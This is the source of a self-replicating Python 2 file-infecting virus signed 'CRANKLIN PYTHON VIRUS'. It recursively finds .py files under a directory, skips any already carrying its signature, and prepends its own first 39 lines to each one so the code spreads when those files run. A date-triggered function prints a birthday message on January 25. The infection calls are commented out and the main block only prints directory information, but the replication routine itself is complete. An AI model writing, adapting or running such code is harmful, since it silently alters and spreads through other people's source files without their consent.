#!/usr/bin/python
import os
import datetime

SIGNATURE = "CRANKLIN PYTHON VIRUS"

def search(path): #recursively called if a directory
    filestoinfect = []
    filelist = os.listdir(path) #os.listdir lists files, directories in path
    for fname in filelist:
        if os.path.isdir(path+"/"+fname): #isdir returns True if the following path (i.e file) is an existing directory
            filestoinfect.extend(search(path+"/"+fname)) # Need to affect a directory and so resursively call search on it to get final list of files to affect
        elif fname[-3:] == ".py": #if a python file
            infected = False #initially assume not affected
            for line in open(path+"/"+fname): #open file, line wise
                if SIGNATURE in line: #aready infcted before
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname) #if signature not found, add to list of files to infect
    return filestoinfect    #final list of files to infect


def infect(filestoinfect):
    virus = open(os.path.abspath(__file__)) #open file thats executing which is this file
    virusstring = ""
    for i,line in enumerate(virus): #grabs the virus portion of the code from itself
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp) #add in virus code, so that it runs whwn the file is run
        f.close()


def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print "HAPPY BIRTHDAY CRANKLIN!"


#filestoinfect = search(os.path.abspath("")) #os.path.abspath("") gives absolute path to current dir
#infect(filestoinfect)
#bomb()

# To start up program, using: python parse.py
if __name__ == "__main__":
   print "Starting Python virus ..."
   print "os.path.abspath() is: {}".format(os.path.abspath(""))
   currentDir = os.path.abspath("")
   print "os.listdir(path) is: {}".format(os.listdir(currentDir))
   print "os.path.abspath(__file__) is: {}".format(os.path.abspath(__file__))